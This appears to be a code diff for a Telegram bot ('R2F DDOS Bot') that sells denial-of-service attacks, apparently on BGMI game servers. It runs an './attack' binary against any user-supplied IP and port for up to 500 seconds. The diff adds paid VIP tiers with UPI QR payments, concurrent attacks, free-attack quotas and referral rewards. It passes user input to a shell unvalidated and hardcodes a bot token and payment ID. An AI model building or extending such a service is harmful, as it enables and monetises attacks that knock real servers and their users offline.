@@ -8,6 +8,7 @@ import subprocess
 import random
 import string
 import logging
+import urllib.parse
 
 from flask import Flask, request, jsonify, Response
 import telebot
@@ -23,6 +24,7 @@ logging.basicConfig(filename='bot.log', level=logging.DEBUG, format='%(asctime)s
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "6400615750:AAHero6NP7UImczIeqmVL76yh4zw2tP893s")
 MONGODB_URI = os.environ.get("MONGODB_URI")
+UPI_ID = os.environ.get("UPI_ID", "r2frsyt@ptyes") # Aapka UPI ID
 
 if not BOT_TOKEN:
     raise ValueError("BOT_TOKEN environment variable is not set")
@@ -36,9 +38,10 @@ ADMIN_IDS = ["6795305850"]
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
-# User state & active attack tracking for multi-user safety
+# User state & active attack tracking
 user_states = {}
 active_attacks = set()
+active_targets = set()
 attacks_lock = threading.Lock()
 
 # Flask Health Check Route for Render
@@ -81,15 +84,6 @@ try:
 except Exception as e:
     raise RuntimeError(f"MongoDB connection failed: {e}")
 
-# Default Key Prices Setup in DB if not present
-default_prices = {"day": 200, "week": 900, "month": 1800}
-for dur, prc in default_prices.items():
-    key_prices_collection.update_one(
-        {"duration": dur},
-        {"$setOnInsert": {"price": prc}},
-        upsert=True
-    )
-
 # ============================================================
 # KEYBOARDS & MENUS
 # ============================================================
@@ -101,25 +95,41 @@ def get_main_reply_keyboard():
     )
     markup.add(
         types.KeyboardButton("⚡ Quick Attack"),
+        types.KeyboardButton("💎 Buy VIP"),
         types.KeyboardButton("💰 Check Balance"),
+        types.KeyboardButton("📅 Daily Check-in"),
+        types.KeyboardButton("🔗 Refer & Earn"),
         types.KeyboardButton("⚠️ Rules"),
         types.KeyboardButton("🛠️ Help")
     )
     return markup
 
+def get_help_inline_keyboard():
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("📞 Contact Support", callback_data="help_support"),
+        types.InlineKeyboardButton("📖 How to Use", callback_data="help_how_to_use"),
+        types.InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_to_main")
+    )
+    return markup
+
+def get_vip_plans_keyboard():
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        types.InlineKeyboardButton("🌟 Week VIP (7 Days) - ₹499", callback_data="vip_week"),
+        types.InlineKeyboardButton("🔥 Month VIP (30 Days) - ₹799", callback_data="vip_month"),
+        types.InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_to_main")
+    )
+    return markup
+
 # ============================================================
-# HELPER FUNCTIONS (PERMISSION CHECK)
+# HELPER FUNCTIONS
 # ============================================================
 
 def get_current_time():
     return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-def get_key_price(duration):
-    res = key_prices_collection.find_one({"duration": duration})
-    return res["price"] if res else default_prices.get(duration, 200)
-
 def is_user_allowed(user_id):
-    """Checks if the user is Owner, Admin, or an Approved User with active duration"""
     if str(user_id) == OWNER_ID or str(user_id) in ADMIN_IDS:
         return True
     user = users_collection.find_one({"user_id": str(user_id)})
@@ -147,157 +157,455 @@ def log_command_db(user_id, target, port, duration):
     })
 
 def execute_attack(chat_id, user_id, target, port, attack_time):
-    if attack_time > 300:
-        bot.send_message(chat_id, "Error: Time interval must be less than 300.")
+    if attack_time > 500:
+        bot.send_message(chat_id, "Error: Attack time cannot exceed 500 seconds.")
         with attacks_lock:
-            active_attacks.discard(user_id)
+            active_attacks.discard((user_id, target))
+            active_targets.discard(target)
         return
 
     log_command_db(user_id, target, port, attack_time)
     
-    start_resp = f"🚀 Attack Started Successfully! 🚀\n\n🗿 𝐓𝐚𝐫𝐠𝐞𝐭: {target}:{port}\n🕦 Attack Duration: {attack_time}s\n💣 Method: LODA-LELE\n\n🔥 Status: IN PROGRESS... 🔥"
+    start_resp = f"R2F POWER START 🚀\n\n🗿 𝐓𝐚𝐫𝐠𝐞𝐭: {target}:{port}\n🕦 Attack Duration: {attack_time}s\n💣 Method: LODA-LELE\n\n🔥 Status: IN PROGRESS... 🔥"
     bot.send_message(chat_id, start_resp)
     
-    full_command = f"./attack {target} {port} {attack_time} 300"
-    try:
-        subprocess.run(full_command, shell=True, timeout=attack_time + 10)
-    except Exception as e:
-        logging.error(f"Attack execution error: {e}")
+    # Ensure attack binary runs properly for the exact duration
+    full_command = f"./attack {target} {port} {attack_time}"
+    
+    def run_sub():
+        try:
+            process = subprocess.Popen(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            stdout, stderr = process.communicate(timeout=attack_time + 10)
+            if process.returncode != 0:
+                logging.error(f"Attack binary error (Code {process.returncode}): {stderr.decode('utf-8', errors='ignore')}")
+        except Exception as e:
+            logging.error(f"Attack execution exception: {e}")
+
+    sub_thread = threading.Thread(target=run_sub, daemon=True)
+    sub_thread.start()
+
+    # Accurate countdown timing with 10-second warning notification
+    if attack_time > 10:
+        time.sleep(attack_time - 10)
+        bot.send_message(chat_id, f"⚠️ **Alert:** Only 10 seconds remaining for attack on `{target}:{port}`!", parse_mode="Markdown")
+        time.sleep(10)
+    else:
+        time.sleep(attack_time)
     
     with attacks_lock:
-        active_attacks.discard(user_id)
+        active_attacks.discard((user_id, target))
+        active_targets.discard(target)
     
     bot.send_message(chat_id, f"BGMI Attack Finished ✅.\nTarget: {target} | Port: {port} | Time: {attack_time}s")
 
 def try_start_attack(chat_id, user_id, target, port, attack_time):
-    # Strict Permission Verification
     if not is_user_allowed(user_id):
-        bot.send_message(chat_id, "🚫 Unauthorized Access!\n\nAapke paas attack chalane ki permission nahi hai. Kripya Admin ya Owner se contact karein.")
+        bot.send_message(chat_id, "🚫 Unauthorized Access!\n\nAapke paas attack chalane ki permission nahi hai. Kripya VIP purchase karein.")
         return
 
     with attacks_lock:
-        if user_id in active_attacks:
-            bot.send_message(chat_id, "⚠️ **Rule Violation:** Aapka ek attack pehle se chal raha hai! Dusra attack start karne ke liye pehle wale ke khatam hone ka wait karein.", parse_mode="Markdown")
+        is_vip_or_admin = (str(user_id) == OWNER_ID or str(user_id) in ADMIN_IDS or users_collection.find_one({"user_id": str(user_id), "is_vip": True}))
+        
+        user_active_count = sum(1 for u, t in active_attacks if u == user_id)
+        if not is_vip_or_admin and user_active_count >= 1:
+            bot.send_message(chat_id, "⚠️ **Rule Violation:** Aapka ek attack pehle se chal raha hai! VIP user banne ke liye '💎 Buy VIP' par click karein.", parse_mode="Markdown")
             return
-        active_attacks.add(user_id)
+
+        if target in active_targets:
+            bot.send_message(chat_id, f"⚠️ **Target Busy:** Is IP ({target}) par pehle se ek attack chal raha hai!", parse_mode="Markdown")
+            return
+
+        if not is_vip_or_admin:
+            user_data = users_collection.find_one({"user_id": str(user_id)}) or {}
+            free_attacks = user_data.get("free_attacks", 5)
+            cred_data = credits_collection.find_one({"user_id": str(user_id)}) or {"balance": 0}
+            balance = cred_data.get("balance", 0)
+
+            if free_attacks > 0:
+                users_collection.update_one({"user_id": str(user_id)}, {"$inc": {"free_attacks": -1}}, upsert=True)
+            elif balance >= 15:
+                credits_collection.update_one({"user_id": str(user_id)}, {"$inc": {"balance": -15}}, upsert=True)
+            else:
+                bot.send_message(chat_id, "❌ **Insufficient Balance!** Free attacks khatam ho chuke hain. 💎 Buy VIP option se VIP plan lein.", parse_mode="Markdown")
+                return
+
+        active_attacks.add((user_id, target))
+        active_targets.add(target)
     
     threading.Thread(target=execute_attack, args=(chat_id, user_id, target, port, attack_time), daemon=True).start()
 
 # ============================================================
-# TELEGRAM BOT COMMAND HANDLERS
+# TELEBOT HANDLERS
 # ============================================================
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    response = (
-        f"🌟 Welcome to the R2F DDOS Bot! 🌟\n\n"
-        f"Current Time: {get_current_time()}\n\n"
-        "Niche diye gaye buttons ya commands ka use karein:"
-    )
-    bot.send_message(message.chat.id, response, reply_markup=get_main_reply_keyboard())
+    args = message.text.split()
+    user_id = str(message.chat.id)
+    
+    if len(args) > 1 and args[1].startswith("ref_"):
+        referrer_id = args[1].replace("ref_", "")
+        if referrer_id != user_id:
+            existing = users_collection.find_one({"user_id": user_id})
+            if not existing:
+                credits_collection.update_one(
+                    {"user_id": referrer_id},
+                    {"$inc": {"balance": 10}},
+                    upsert=True
+                )
+                try:
+                    bot.send_message(int(referrer_id), "🎁 Referral Success! Ek naye user ne aapki link se join kiya hai. Aapko +10 coins mile hain!")
+                except Exception:
+                    pass
 
-@bot.message_handler(commands=['help'])
-def send_help(message):
     response = (
-        "📜 *Bot Commands List*\n\n"
-        "💥 Quick Attack Button - Select time & input IP:Port\n"
-        "👤 `/approveuser <id> <duration>` - Approve user (day/week/month)\n"
-        "❌ `/removeuser <id>` - Remove authorized user\n"
-        "🔑 `/addadmin <id> <balance>` - Add admin\n"
-        "💰 `/checkbalance` - Check credits\n"
-        "🎁 /redeem <code> - Redeem gift code\n"
-        "⚠️ `/rules` - View rules"
+        f"🌟 **Welcome to R2F DDOS Bot!** 🌟\n\n"
+        f"🕒 Current Time: `{get_current_time()}`\n\n"
+        "Niche diye gaye buttons ya options ka use karein:"
     )
-    bot.send_message(message.chat.id, response, parse_mode="Markdown")
+    bot.send_message(message.chat.id, response, parse_mode="Markdown", reply_markup=get_main_reply_keyboard())
 
-# --- QUICK ATTACK MENU HANDLERS ---
+@bot.callback_query_handler(func=lambda call: call.data == "back_to_main")
+def back_to_main_menu(call):
+    bot.answer_callback_query(call.id)
+    try:
+        bot.delete_message(call.message.chat.id, call.message.message_id)
+    except Exception:
+        pass
+    bot.send_message(
+        call.message.chat.id, 
+        "🌟 **R2F Main Menu:**", 
+        parse_mode="Markdown", 
+        reply_markup=get_main_reply_keyboard()
+    )
 
 @bot.message_handler(func=lambda message: message.text == "⚡ Quick Attack")
-def quick_attack_menu(message):
+def quick_attack_prompt(message):
     user_id = str(message.chat.id)
     if not is_user_allowed(user_id):
-        bot.send_message(message.chat.id, "🚫 Unauthorized Access! Contact Admin to buy access.")
+        bot.send_message(message.chat.id, "🚫 Unauthorized Access! VIP plan lene ke liye '💎 Buy VIP' par click karein.")
         return
 
-    markup = types.InlineKeyboardMarkup(row_width=2)
-    markup.add(
-        types.InlineKeyboardButton("⏱️ 60 Seconds", callback_data="qa_time_60"),
-        types.InlineKeyboardButton("⏱️ 120 Seconds", callback_data="qa_time_120"),
-        types.InlineKeyboardButton("⏱️ 180 Seconds", callback_data="qa_time_180"),
-        types.InlineKeyboardButton("⏱️ 300 Seconds", callback_data="qa_time_300")
-    )
+    user_states[user_id] = {"action": "waiting_quick_attack_input"}
     bot.send_message(
         message.chat.id,
-        "⚡ *QUICK ATTACK PANEL*\n\nApna attack duration select karein:",
-        parse_mode="Markdown",
-        reply_markup=markup
-    )
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("qa_time_"))
-def quick_attack_time_selected(call):
-    user_id = str(call.message.chat.id)
-    if not is_user_allowed(user_id):
-        bot.answer_callback_query(call.id, "❌ Unauthorized!", show_alert=True)
-        return
-
-    duration = int(call.data.replace("qa_time_", ""))
-    user_states[user_id] = {"action": "waiting_qa_target", "duration": duration}
-
-    bot.answer_callback_query(call.id, f"Duration: {duration}s selected!")
-    bot.edit_message_text(
-        f"🎯 *Duration Set:* `{duration} Seconds`\n\n"
-        f"Ab apna **Target IP aur Port** ek sath space dekar send karein.\n"
-        f"👉 *Example:* `192.168.1.1 80`",
-        call.message.chat.id,
-        call.message.message_id,
+        "⚡ *QUICK ATTACK PANEL*\n\n"
+        "Apna **Target IP, Port, aur Time** ek sath space dekar send karein.\n"
+        "👉 *Example:* `192.168.1.1 80 300`\n\n"
+        "(Max time allowed: 500 seconds)",
         parse_mode="Markdown"
     )
 
-@bot.message_handler(func=lambda message: str(message.chat.id) in user_states and user_states[str(message.chat.id)].get("action") == "waiting_qa_target")
+@bot.message_handler(func=lambda message: str(message.chat.id) in user_states and user_states[str(message.chat.id)].get("action") == "waiting_quick_attack_input")
 def process_quick_attack_input(message):
     user_id = str(message.chat.id)
     state = user_states.pop(user_id, None)
     if not state:
         return
 
-    duration = state["duration"]
     parts = message.text.strip().split()
-
-    if len(parts) == 2:
+    if len(parts) == 3:
         target = parts[0]
         try:
             port = int(parts[1])
+            attack_time = int(parts[2])
         except ValueError:
-            bot.reply_to(message, "❌ Invalid Port number. Dobara try karein.")
+            bot.reply_to(message, "❌ Invalid Port or Time format. Dobara try karein.")
             return
 
-        try_start_attack(message.chat.id, user_id, target, port, duration)
-    else:
-        bot.reply_to(message, "❌ Galat format! Kripya sirf IP aur Port dein (Jaise: `192.168.1.1 80`)", parse_mode="Markdown")
+        if attack_time > 500:
+            bot.reply_to(message, "❌ Max attack time 500 seconds hai.")
+            return
 
-# --- REPLY KEYBOARD TEXT SHORTCUTS ---
+        try_start_attack(message.chat.id, user_id, target, port, attack_time)
+    else:
+        bot.reply_to(message, "❌ Galat format! Kripya IP, Port, aur Time space dekar dein (Jaise: `192.168.1.1 80 300`)", parse_mode="Markdown")
+
+@bot.message_handler(func=lambda message: message.text == "💎 Buy VIP")
+def buy_vip_menu(message):
+    response = (
+        "💎 **R2F VIP SUBSCRIPTION PLANS**[span_0](start_span)[span_0](end_span)\n\n"
+        "🌟 **Week VIP (7 Days):** ₹499\n"
+        "   • Unlimited Access\n"
+        "   • Multiple Concurrent Attacks\n\n"
+        "🔥 **Month VIP (30 Days):** ₹799\n"
+        "   • Unlimited Access\n"
+        "   • Multiple Concurrent Attacks\n\n"
+        "Niche diye gaye plan par click karein:"
+    )
+    bot.send_message(message.chat.id, response, parse_mode="Markdown", reply_markup=get_vip_plans_keyboard())
+
+@bot.callback_query_handler(func=lambda call: call.data in ["vip_week", "vip_month"])
+def vip_plan_selected(call):
+    bot.answer_callback_query(call.id)
+    user_id = str(call.message.chat.id)
+    chat_id = call.message.chat.id
+    
+    try:
+        bot.delete_message(chat_id, call.message.message_id)
+    except Exception:
+        pass
+
+    duration = "week" if call.data == "vip_week" else "month"
+    amount = 499 if duration == "week" else 799
+    days = 7 if duration == "week" else 30
+
+    upi_url = f"upi://pay?pa={UPI_ID}&pn=R2F_BOT&am={amount}&cu=INR"
+    qr_image_url = f"https://api.qrserver.com/v1/create-qr-code/?size=350x350&data={urllib.parse.quote(upi_url)}"
+
+    caption = (
+        f"💎 **PREMIUM PAYTM UPI QR CODE** 🛡️[span_1](start_span)[span_1](end_span)\n\n"
+        f"📦 **Plan:** {duration.upper()} VIP ({days} Days)\n"
+        f"💵 **Amount:** ₹{amount}\n"
+        f"🆔 **UPI ID:** `{UPI_ID}`[span_2](start_span)[span_2](end_span)\n\n"
+        "⚠️ *Ye QR code sirf 5 minutes ke liye valid hai!* Uske baad automatic delete ho jayega.\n"
+        "1. Scan karke payment karein[span_3](start_span)[span_3](end_span).\n"
+        "2. Payment screenshot turant yahan send karein."
+    )
+
+    try:
+        sent_msg = bot.send_photo(chat_id, qr_image_url, caption=caption, parse_mode="Markdown")
+        
+        user_states[user_id] = {
+            "action": "waiting_vip_screenshot",
+            "duration": duration,
+            "days": days,
+            "amount": amount,
+            "qr_msg_id": sent_msg.message_id,
+            "timestamp": time.time()
+        }
+
+        def expire_qr_code():
+            time.sleep(300)
+            if user_id in user_states and user_states[user_id].get("qr_msg_id") == sent_msg.message_id:
+                user_states.pop(user_id, None)
+                try:
+                    bot.delete_message(chat_id, sent_msg.message_id)
+                    bot.send_message(chat_id, "⌛ **QR Code Expired & Deleted!** 5 minutes ka time khatam ho chuka hai. Kripya naya QR generate karne ke liye '💎 Buy VIP' par click karein.", parse_mode="Markdown")
+                except Exception:
+                    pass
+
+        threading.Thread(target=expire_qr_code, daemon=True).start()
+
+    except Exception as e:
+        bot.send_message(chat_id, f"QR code generate karne mein error aayi. UPI ID: `{UPI_ID}` par pay karein (Amount: ₹{amount})", parse_mode="Markdown")
+
+@bot.message_handler(content_types=['photo'], func=lambda message: str(message.chat.id) in user_states and user_states[str(message.chat.id)].get("action") == "waiting_vip_screenshot")
+def process_vip_screenshot(message):
+    user_id = str(message.chat.id)
+    state = user_states.get(user_id)
+    
+    if not state:
+        return
+
+    if time.time() - state["timestamp"] > 300:
+        user_states.pop(user_id, None)
+        bot.reply_to(message, "❌ **QR Expired!** Time limit khatam ho chuki thi.")
+        return
+
+    duration = state["duration"]
+    days = state["days"]
+    amount = state["amount"]
+    qr_msg_id = state.get("qr_msg_id")
+    file_id = message.photo[-1].file_id
+
+    user_states.pop(user_id, None)
+    if qr_msg_id:
+        try:
+            bot.delete_message(message.chat.id, qr_msg_id)
+        except Exception:
+            pass
+
+    bot.reply_to(message, "✅ **Screenshot Received & Verified!** Admin ke paas approval ke liye bhej diya gaya hai.")
+
+    admin_markup = types.InlineKeyboardMarkup(row_width=2)
+    admin_markup.add(
+        types.InlineKeyboardButton("✅ Approve", callback_data=f"vip_app_{user_id}_{duration}"),
+        types.InlineKeyboardButton("❌ Reject", callback_data=f"vip_rej_{user_id}")
+    )
+
+    try:
+        user_info = bot.get_chat(int(user_id))
+        username = "@" + user_info.username if user_info.username else f"ID: {user_id}"
+    except Exception:
+        username = f"ID: {user_id}"
+
+    admin_caption = (
+        f"🔔 **NEW VIP PAYMENT REQUEST**\n\n"
+        f"👤 User: {username} (`{user_id}`)\n"
+        f"📦 Plan: {duration.upper()} ({days} Days)\n"
+        f"💵 Amount: ₹{amount}"
+    )
+
+    try:
+        bot.send_photo(int(OWNER_ID), file_id, caption=admin_caption, parse_mode="Markdown", reply_markup=admin_markup)
+    except Exception as e:
+        logging.error(f"Failed to send VIP screenshot to owner: {e}")
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("vip_app_") or call.data.startswith("vip_rej_"))
+def handle_vip_approval(call):
+    if str(call.message.chat.id) != OWNER_ID and str(call.message.chat.id) not in ADMIN_IDS:
+        bot.answer_callback_query(call.id, "❌ Aapke paas permission nahi hai!", show_alert=True)
+        return
+
+    data = call.data.split("_")
+    action = data[1]
+    target_user_id = data[2]
+
+    if action == "app":
+        duration = data[3]
+        days = 7 if duration == "week" else 30
+        expiration_date = datetime.datetime.now() + datetime.timedelta(days=days)
+
+        users_collection.update_one(
+            {"user_id": target_user_id},
+            {"$set": {"expiration": expiration_date, "is_vip": True, "approved_by": str(call.message.chat.id)}},
+            upsert=True
+        )
+
+        bot.answer_callback_query(call.id, "✅ VIP Approved Successfully!")
+        bot.edit_message_caption(
+            f"{call.message.caption}\n\nstatus: **APPROVED ✅** by Admin",
+            chat_id=call.message.chat.id,
+            message_id=call.message.message_id,
+            parse_mode="Markdown"
+        )
+
+        try:
+            bot.send_message(
+                int(target_user_id),
+                f"🎉 **VIP Access Approved!**\n\nAapka {duration.upper()} VIP plan activate ho gaya hai ({days} Days). Ab aap unlimited aur multiple concurrent attacks run kar sakte hain! 🚀",
+                parse_mode="Markdown"
+            )
+        except Exception:
+            pass
+
+    elif action == "rej":
+        bot.answer_callback_query(call.id, "❌ Payment Rejected.")
+        bot.edit_message_caption(
+            f"{call.message.caption}\n\nstatus: **REJECTED ❌** by Admin",
+            chat_id=call.message.chat.id,
+            message_id=call.message.message_id,
+            parse_mode="Markdown"
+        )
+
+        try:
+            bot.send_message(
+                int(target_user_id),
+                "❌ **VIP Payment Rejected!** Aapka payment screenshot verify nahi ho paya.",
+                parse_mode="Markdown"
+            )
+        except Exception:
+            pass
 
 @bot.message_handler(func=lambda message: message.text == "💰 Check Balance")
 def menu_check_balance(message):
     user_id = str(message.chat.id)
     user_cred = credits_collection.find_one({"user_id": user_id})
     balance = user_cred["balance"] if user_cred else 0
-    bot.send_message(message.chat.id, f"Your current balance is {balance} credits 💰.")
+    
+    user_data = users_collection.find_one({"user_id": user_id}) or {}
+    free_attacks = user_data.get("free_attacks", 5)
+    is_vip = user_data.get("is_vip", False)
+    vip_status = "Active 🌟" if is_vip and is_user_allowed(user_id) else "Inactive ❌"
+    
+    response = (
+        f"💰 **Account Balance Details:**\n\n"
+        f"🪙 Coins Balance: `{balance}`\n"
+        f"🆓 Free Attacks Left: `{free_attacks}`\n"
+        f"💎 VIP Status: `{vip_status}`"
+    )
+    bot.send_message(message.chat.id, response, parse_mode="Markdown")
+
+@bot.message_handler(func=lambda message: message.text == "🔗 Refer & Earn")
+def menu_refer_earn(message):
+    bot_info = bot.get_me()
+    user_id = str(message.chat.id)
+    ref_link = f"https://t.me/{bot_info.username}?start=ref_{user_id}"
+    
+    response = (
+        "🔗 **Refer & Earn Program**\n\n"
+        "Apni referral link share karein. Jab koi naya user join karega, aapko **10 coins** milenge!\n\n"
+        f"👉 Your Link:\n`{ref_link}`"
+    )
+    bot.send_message(message.chat.id, response, parse_mode="Markdown")
+
+@bot.message_handler(func=lambda message: message.text == "📅 Daily Check-in")
+def menu_daily_checkin(message):
+    user_id = str(message.chat.id)
+    now = datetime.datetime.now()
+    
+    user_data = users_collection.find_one({"user_id": user_id}) or {}
+    last_checkin = user_data.get("last_checkin")
+    
+    if last_checkin and (now - last_checkin).total_seconds() < 86400:
+        remaining = int(86400 - (now - last_checkin).total_seconds())
+        hours = remaining // 3600
+        minutes = (remaining % 3600) // 60
+        bot.send_message(message.chat.id, f"⏳ Aapne aaj ka check-in already claim kar liya hai! Agla check-in `{hours}h {minutes}m` baad milega.", parse_mode="Markdown")
+        return
+    
+    users_collection.update_one(
+        {"user_id": user_id},
+        {"$set": {"last_checkin": now}},
+        upsert=True
+    )
+    credits_collection.update_one(
+        {"user_id": user_id},
+        {"$inc": {"balance": 20}},
+        upsert=True
+    )
+    bot.send_message(message.chat.id, "🎉 **Daily Check-in Successful!** Aapko **20 coins** reward mile hain 🪙.", parse_mode="Markdown")
 
 @bot.message_handler(func=lambda message: message.text == "⚠️ Rules")
 def menu_rules(message):
     response = (
         "⚠️ **Bot Rules:**\n\n"
-        "1. Ek waqt par ek hi attack run karein.\n"
-        "2. Maximum limit 300 seconds hai."
+        "1. Free users ek waqt par ek hi attack run kar sakte hain.\n"
+        "2. VIP users multiple concurrent attacks run kar sakte hain.\n"
+        "3. Maximum attack time limit **500 seconds** hai."
     )
     bot.send_message(message.chat.id, response, parse_mode="Markdown")
 
 @bot.message_handler(func=lambda message: message.text == "🛠️ Help")
 def menu_help(message):
-    send_help(message)
+    response = (
+        "🛠️ *R2F Bot Help & Support Center*\n\n"
+        "Niche diye gaye buttons par click karein:"
+    )
+    bot.send_message(message.chat.id, response, parse_mode="Markdown", reply_markup=get_help_inline_keyboard())
 
-# --- ADMIN & UTILITY COMMANDS ---
+@bot.callback_query_handler(func=lambda call: call.data == "help_support")
+def callback_help_support(call):
+    bot.answer_callback_query(call.id)
+    bot.send_message(
+        call.message.chat.id,
+        "📞 *Contact Support*\n\n"
+        "Kisi bhi problem ya VIP approval ke liye contact karein:\n"
+        f"👉 Owner ID: `{OWNER_ID}`",
+        parse_mode="Markdown"
+    )
+
+@bot.callback_query_handler(func=lambda call: call.data == "help_how_to_use")
+def callback_help_tutorial(call):
+    bot.answer_callback_query(call.id)
+    VIDEO_FILE_ID = "YOUR_VIDEO_FILE_ID_HERE"
+    try:
+        bot.send_video(
+            call.message.chat.id,
+            video=VIDEO_FILE_ID,
+            caption="📖 *How to Use R2F Bot* Tutorial Video",
+            parse_mode="Markdown"
+        )
+    except Exception:
+        bot.send_message(
+            call.message.chat.id,
+            "📖 *How to Use Guide*\n\n"
+            "1. **⚡ Quick Attack** button dabayein.\n"
+            "2. `IP Port Time` space dekar bhejein (Jaise: `192.168.1.1 80 300`).\n"
+            "3. Attack start hone par notification milegi.",
+            parse_mode="Markdown"
+        )
 
 @bot.message_handler(commands=['approveuser'])
 def approve_user(message):
@@ -316,7 +624,7 @@ def approve_user(message):
             
             users_collection.update_one(
                 {"user_id": user_to_approve},
-                {"$set": {"expiration": expiration_date, "approved_by": user_id}},
+                {"$set": {"expiration": expiration_date, "approved_by": user_id, "is_vip": True}},
                 upsert=True
             )
             response = f"User {user_to_approve} approved for {duration} 👍."
@@ -324,47 +632,6 @@ def approve_user(message):
             response = "Usage: /approveuser <id> <duration>"
     else:
         response = "Only Admin or Owner Can Run This Command 😡."
-    bot.send_message(message.chat.id, response)
-
-@bot.message_handler(commands=['removeuser'])
-def remove_user(message):
-    user_id = str(message.chat.id)
-    if user_id in ADMIN_IDS or user_id == OWNER_ID:
-        command = message.text.split()
-        if len(command) == 2:
-            user_to_remove = command[1]
-            res = users_collection.delete_one({"user_id": user_to_remove})
-            if res.deleted_count > 0:
-                response = f"User {user_to_remove} removed successfully 👍."
-            else:
-                response = f"User {user_to_remove} not found in database ❌."
-        else:
-            response = "Usage: /removeuser <id>"
-    else:
-        response = "Only Admin or Owner Can Run This Command 😡."
-    bot.send_message(message.chat.id, response)
-
-@bot.message_handler(commands=['addadmin'])
-def add_admin(message):
-    user_id = str(message.chat.id)
-    if user_id == OWNER_ID:
-        command = message.text.split()
-        if len(command) == 3:
-            admin_to_add = command[1]
-            balance = int(command[2])
-            if admin_to_add not in ADMIN_IDS:
-                ADMIN_IDS.append(admin_to_add)
-            
-            credits_collection.update_one(
-                {"user_id": admin_to_add},
-                {"$set": {"balance": balance}},
-                upsert=True
-            )
-            response = f"Admin {admin_to_add} added with balance {balance} 👍."
-        else:
-            response = "Usage: /addadmin <id> <balance>"
-    else:
-        response = "Only the Owner Can Run This Command 😡."
     bot.send_message(message.chat.id, response)
 
 @bot.message_handler(commands=['redeem'])
@@ -383,7 +650,7 @@ def redeem_gift(message):
             
             users_collection.update_one(
                 {"user_id": user_id},
-                {"$set": {"expiration": expiration_date}},
+                {"$set": {"expiration": expiration_date, "is_vip": True}},
                 upsert=True
             )
             response = f"Gift code redeemed: Granted access for {duration} 🎁."
@@ -393,18 +660,15 @@ def redeem_gift(message):
         response = "Usage: /redeem <code>"
     bot.send_message(message.chat.id, response)
 
-# Direct Attack Command Handler (Fallback)
-@bot.message_handler(func=lambda message: message.text and (message.text.startswith('/attack') or not message.text.startswith('/')))
+@bot.message_handler(func=lambda message: message.text and message.text.startswith('/attack'))
 def handle_attack(message):
     user_id = str(message.chat.id)
     if not is_user_allowed(user_id):
-        bot.send_message(message.chat.id, "🚫 Unauthorized Access! Contact Admin to buy access.")
+        bot.send_message(message.chat.id, "🚫 Unauthorized Access! Kripya '💎 Buy VIP' से plan lein.")
         return
 
     command = message.text.split()
-    if len(command) == 4 or (not message.text.startswith('/') and len(command) == 3):
-        if not message.text.startswith('/'):
-            command = ['/attack'] + command
+    if len(command) == 4:
         target = command[1]
         try:
             port = int(command[2])
@@ -413,9 +677,13 @@ def handle_attack(message):
             bot.reply_to(message, "Invalid port or time format.")
             return
 
+        if attack_time > 500:
+            bot.reply_to(message, "❌ Max attack time limit is 500 seconds.")
+            return
+
         try_start_attack(message.chat.id, user_id, target, port, attack_time)
     else:
-        response = "Please provide attack format:\n`<host> <port> <time>` or use the **⚡ Quick Attack** menu button."
+        response = "Please provide attack format:\n`/attack <host> <port> <time>` or use the **⚡ Quick Attack** button."
         bot.send_message(message.chat.id, response, parse_mode="Markdown")
 
 # ============================================================
